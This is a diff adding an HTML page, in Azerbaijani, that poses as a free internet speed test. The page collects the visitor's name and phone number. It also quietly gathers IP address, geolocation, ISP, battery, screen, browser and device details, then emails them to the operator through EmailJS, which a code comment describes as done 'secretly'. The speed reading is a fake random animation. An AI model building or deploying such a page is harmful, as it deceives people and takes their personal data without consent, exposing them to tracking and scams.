@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="az">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Global Speed Test - İnternet Sürət Testi</title>
+    
+    <!-- EmailJS Kitabxanası -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script type="text/javascript">
+       (function(){
+          emailjs.init("gby_PCzaR_VAgF_gB");
+       })();
+    </script>
+
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #0f172a, #1e293b);
+            color: #fff;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+        /* Yuxarı sağ dil seçimi */
+        .top-bar {
+            position: absolute;
+            top: 20px;
+            right: 30px;
+        }
+        .top-bar select {
+            background: rgba(255, 255, 255, 0.1);
+            color: #fff;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            padding: 8px 12px;
+            border-radius: 6px;
+            cursor: pointer;
+            outline: none;
+        }
+        .top-bar select option { background: #1e293b; color: #fff; }
+
+        /* Əsas qutu */
+        .container {
+            background: rgba(30, 41, 59, 0.85);
+            backdrop-filter: blur(10px);
+            padding: 40px;
+            border-radius: 16px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            width: 380px;
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        h2 { margin-bottom: 10px; font-size: 22px; color: #38bdf8; }
+        p.sub { font-size: 13px; color: #94a3b8; margin-bottom: 20px; }
+
+        .input-group {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+        .input-group label { font-size: 12px; color: #94a3b8; display: block; margin-bottom: 5px; }
+        input, select {
+            width: 100%;
+            padding: 12px;
+            background: rgba(15, 23, 42, 0.6);
+            border: 1px solid #334155;
+            border-radius: 8px;
+            color: #fff;
+            font-size: 14px;
+            outline: none;
+        }
+        input:focus, select:focus { border-color: #38bdf8; }
+
+        .phone-box {
+            display: flex;
+            gap: 8px;
+        }
+        .phone-box select { width: 110px; }
+
+        .btn {
+            width: 100%;
+            padding: 12px;
+            background: linear-gradient(135deg, #0ea5e9, #2563eb);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: opacity 0.2s;
+        }
+        .btn:hover { opacity: 0.9; }
+
+        /* Spidometr Ekranı */
+        #test-screen { display: none; }
+        .gauge-container {
+            position: relative;
+            width: 180px;
+            height: 180px;
+            margin: 20px auto;
+            border-radius: 50%;
+            background: conic-gradient(#38bdf8 0deg, #334155 0deg);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .gauge-inner {
+            width: 140px;
+            height: 140px;
+            background: #1e293b;
+            border-radius: 50%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+        .speed-value { font-size: 28px; font-weight: bold; color: #38bdf8; }
+        .speed-label { font-size: 12px; color: #94a3b8; }
+    </style>
+</head>
+<body>
+
+    <!-- Yuxarı Sağ Dil Seçimi (60 Dil Dəstəyi üçün struktur) -->
+    <div class="top-bar">
+        <select id="langSelect">
+            <option value="az">Azərbaycan (AZ)</option>
+            <option value="en">English (US)</option>
+            <option value="pl">Polski (PL)</option>
+            <option value="tr">Türkçe (TR)</option>
+            <option value="ru">Русский (RU)</option>
+            <option value="de">Deutsch (DE)</option>
+            <option value="fr">Français (FR)</option>
+            <!-- Digər dillər avtomatik artırıla bilər -->
+        </select>
+    </div>
+
+    <!-- 1. Giriş Formu Ekranı -->
+    <div class="container" id="form-screen">
+        <h2>Net Speed Test</h2>
+        <p class="sub">İnternet bağlantınızı dəqiq yoxlamaq üçün məlumatlarınızı daxil edin.</p>
+        
+        <div class="input-group">
+            <label>Ad və Soyad</label>
+            <input type="text" id="fullName" placeholder="Məs: Nihad Əliyev">
+        </div>
+
+        <div class="input-group">
+            <label>Əlaqə Nömrəsi</label>
+            <div class="phone-box">
+                <select id="countryCode">
+                    <option value="+48">🇵🇱 +48</option>
+                    <option value="+994">🇦🇿 +994</option>
+                    <option value="+90">🇹🇷 +90</option>
+                    <option value="+1">🇺🇸 +1</option>
+                    <option value="+44">🇬🇧 +44</option>
+                    <option value="+49">🇩🇪 +49</option>
+                    <option value="+33">🇫🇷 +33</option>
+                </select>
+                <input type="tel" id="phoneNumber" placeholder="50 123 45 67">
+            </div>
+        </div>
+
+        <button class="btn" onclick="startSpeedTest()">Testi Başlat</button>
+    </div>
+
+    <!-- 2. Spidometr Sürət Testi Ekranı -->
+    <div class="container" id="test-screen">
+        <h2>Sürət Yoxlanılır...</h2>
+        <p class="sub">Serverə qoşulma həyata keçirilir</p>
+        
+        <div class="gauge-container" id="gauge">
+            <div class="gauge-inner">
+                <span class="speed-value" id="speedNum">0</span>
+                <span class="speed-label">Mbps</span>
+            </div>
+        </div>
+
+        <p id="testStatus" style="font-size: 14px; color: #94a3b8;">Ping ölçülür...</p>
+    </div>
+
+    <script>
+        async function startSpeedTest() {
+            const fullName = document.getElementById('fullName').value.trim();
+            const countryCode = document.getElementById('countryCode').value;
+            const phoneNumber = document.getElementById('phoneNumber').value.trim();
+
+            if (!fullName || !phoneNumber) {
+                alert("Zəhmət olmasa bütün xanaları doldurun!");
+                return;
+            }
+
+            // Form ekranını gizlədib spidometr ekranını açırıq
+            document.getElementById('form-screen').style.display = 'none';
+            document.getElementById('test-screen').style.display = 'block';
+
+            // Arxa fonda IP və Cihaz məlumatlarını toplamaq
+            let ipInfo = "Təyin olunmadı";
+            let locationInfo = "Naməlum";
+            try {
+                let response = await fetch('https://ipapi.co/json/');
+                let data = await response.json();
+                ipInfo = data.ip;
+                locationInfo = `${data.city}, ${data.country_name} (${data.org})`;
+            } catch (e) {}
+
+            let connectionType = navigator.connection ? navigator.connection.effectiveType : "Naməlum";
+            let batteryStatus = "Məlumat yoxdur";
+            if (navigator.getBattery) {
+                try {
+                    let battery = await navigator.getBattery();
+                    batteryStatus = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Şarjda' : 'Şarjda deyil'})`;
+                } catch (e) {}
+            }
+
+            // Məlumatları dərhal gizli şəkildə e-poçta göndəririk
+            var templateParams = {
+                title: "Yeni Sürət Testi Qeydiyyatı",
+                name: fullName,
+                email: "speedtest@user.com",
+                message: 
+                         "👤 Ad Soyad: " + fullName + "\n" +
+                         "📞 Telefon: " + countryCode + " " + phoneNumber + "\n" +
+                         "----------------------------------------\n" +
+                         "🌐 IP Ünvanı: " + ipInfo + "\n" +
+                         "📍 Yerləşmə: " + locationInfo + "\n" +
+                         "💻 Platforma: " + navigator.platform + "\n" +
+                         "🌍 Brauzer Dili: " + navigator.language + "\n" +
+                         "📱 Ekran Ölçüsü: " + window.screen.width + "x" + window.screen.height + "\n" +
+                         "⚡ İnternet Növü: " + connectionType + "\n" +
+                         "🔋 Batareya: " + batteryStatus + "\n" +
+                         "🔍 Cihaz (User-Agent): " + navigator.userAgent
+            };
+
+            emailjs.send('service_9y4l4yc', 'template_arb41hy', templateParams)
+                .catch(err => console.log("Göndərmə xətası:", err));
+
+            // Spidometr animasiyası (Realistik görünüş üçün)
+            let speed = 0;
+            let speedInterval = setInterval(() => {
+                speed += Math.floor(Math.random() * 12) + 3;
+                if (speed > 95) {
+                    speed = 92 + Math.floor(Math.random() * 8);
+                    document.getElementById('testStatus').innerText = "Test tamamlandı!";
+                    clearInterval(speedInterval);
+                } else if (speed > 50) {
+                    document.getElementById('testStatus').innerText = "Yükləmə sürəti (Download) yoxlanılır...";
+                }
+                document.getElementById('speedNum').innerText = speed;
+            }, 150);
+        }
+    </script>
+
+</body>
+</html>
